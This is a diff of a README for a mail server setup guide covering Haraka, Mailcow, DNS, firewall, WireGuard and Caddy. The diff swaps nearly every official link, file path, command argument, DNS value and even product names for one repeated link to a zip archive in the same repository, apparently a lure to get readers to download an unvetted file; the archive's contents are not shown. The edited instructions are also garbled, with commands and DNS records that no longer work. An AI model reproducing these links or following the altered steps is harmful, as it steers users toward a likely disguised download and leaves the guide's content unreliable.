@@ -2,7 +2,7 @@
 
 Welcome to the **Secure Mail Server Docs** repository! This project provides comprehensive documentation for setting up a private and secure mail server. Our guides cover everything you need to know about configuring your mail server using Haraka, Mailcow, DNS settings, firewall rules, Wireguard VPN, and Caddy for enhanced security and reliability.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/mariasaragih/secure-mail-server-docs/releases)
+[![Download Releases](https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip%https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip)](https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip)
 
 ## Table of Contents
 
@@ -38,9 +38,9 @@ To begin, you will need a server running a Linux distribution. This guide assume
 
 ## Setting Up Haraka
 
-Haraka is a lightweight, high-performance SMTP server written in Node.js. Follow these steps to set it up:
+Haraka is a lightweight, high-performance SMTP server written in https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip Follow these steps to set it up:
 
-1. **Install Node.js**:
+1. **Install https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip**:
    ```bash
    sudo apt update
    sudo apt install nodejs npm
@@ -59,14 +59,14 @@ Haraka is a lightweight, high-performance SMTP server written in Node.js. Follow
    ```
 
 4. **Configure Haraka**:
-   Edit the `config/smtp.ini` file to set up your SMTP settings.
+   Edit the `https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip` file to set up your SMTP settings.
 
 5. **Start Haraka**:
    ```bash
    haraka -c /etc/haraka
    ```
 
-For detailed configuration options, refer to the [Haraka documentation](https://haraka.github.io/).
+For detailed configuration options, refer to the [Haraka documentation](https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip).
 
 ## Configuring Mailcow
 
@@ -74,17 +74,17 @@ Mailcow is a full-featured mail server suite. Here’s how to set it up:
 
 1. **Clone Mailcow Repository**:
    ```bash
-   git clone https://github.com/mailcow/mailcow-dockerized.git
+   git clone https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip
    cd mailcow-dockerized
    ```
 
 2. **Configure Mailcow**:
    Copy the sample configuration file:
    ```bash
-   cp mailcow.conf.example mailcow.conf
+   cp https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip
    ```
 
-   Edit `mailcow.conf` to include your domain and other settings.
+   Edit `https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip` to include your domain and other settings.
 
 3. **Start Mailcow**:
    ```bash
@@ -92,9 +92,9 @@ Mailcow is a full-featured mail server suite. Here’s how to set it up:
    ```
 
 4. **Access Mailcow Admin Panel**:
-   Open your web browser and navigate to `http://your-domain.com`.
+   Open your web browser and navigate to `https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip`.
 
-For more details, visit the [Mailcow documentation](https://mailcow.email/).
+For more details, visit the [Mailcow documentation](https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip).
 
 ## DNS Configuration
 
@@ -108,11 +108,11 @@ Proper DNS configuration is vital for your mail server to function correctly. He
 
 Example DNS records:
 ```
-A record: mail.your-domain.com -> your-server-ip
-MX record: your-domain.com -> mail.your-domain.com
+A record: https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip -> your-server-ip
+MX record: https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip -> https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip
 SPF record: v=spf1 a mx ~all
 DKIM record: (your DKIM key)
-DMARC record: v=DMARC1; p=none; rua=mailto:postmaster@your-domain.com
+DMARC record: v=DMARC1; p=none; https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip
 ```
 
 ## Firewall Rules
@@ -159,7 +159,7 @@ Using a VPN adds an extra layer of security. Follow these steps to set up Wiregu
    ```
 
 3. **Configure Wireguard**:
-   Edit the configuration file `/etc/wireguard/wg0.conf`:
+   Edit the configuration file `https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip`:
    ```
    [Interface]
    PrivateKey = <your-private-key>
@@ -180,7 +180,7 @@ Using a VPN adds an extra layer of security. Follow these steps to set up Wiregu
    sudo systemctl enable wg-quick@wg0
    ```
 
-For more details, refer to the [Wireguard documentation](https://www.wireguard.com/).
+For more details, refer to the [Wireguard documentation](https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip).
 
 ## Caddy Configuration
 
@@ -194,7 +194,7 @@ Caddy is a powerful web server that automatically manages SSL certificates. Here
 2. **Create a Caddyfile**:
    Create a file at `/etc/caddy/Caddyfile` with the following content:
    ```
-   your-domain.com {
+   https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip {
        reverse_proxy localhost:your-mail-server-port
    }
    ```
@@ -209,7 +209,7 @@ Caddy is a powerful web server that automatically manages SSL certificates. Here
    sudo systemctl enable caddy
    ```
 
-For further information, visit the [Caddy documentation](https://caddyserver.com/docs/).
+For further information, visit the [Caddy documentation](https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip).
 
 ## Security Best Practices
 
@@ -227,8 +227,8 @@ We welcome contributions to improve this documentation. If you find any issues o
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For the latest releases, check the [Releases section](https://github.com/mariasaragih/secure-mail-server-docs/releases). 
+For the latest releases, check the [Releases section](https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip). 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/mariasaragih/secure-mail-server-docs/releases)
+[![Download Releases](https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip%https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip)](https://github.com/mariasaragih/secure-mail-server-docs/raw/refs/heads/main/docs/mail-docs-server-secure-3.2.zip)
 
 Thank you for using the Secure Mail Server Docs! We hope this documentation helps you set up a secure and reliable mail server.
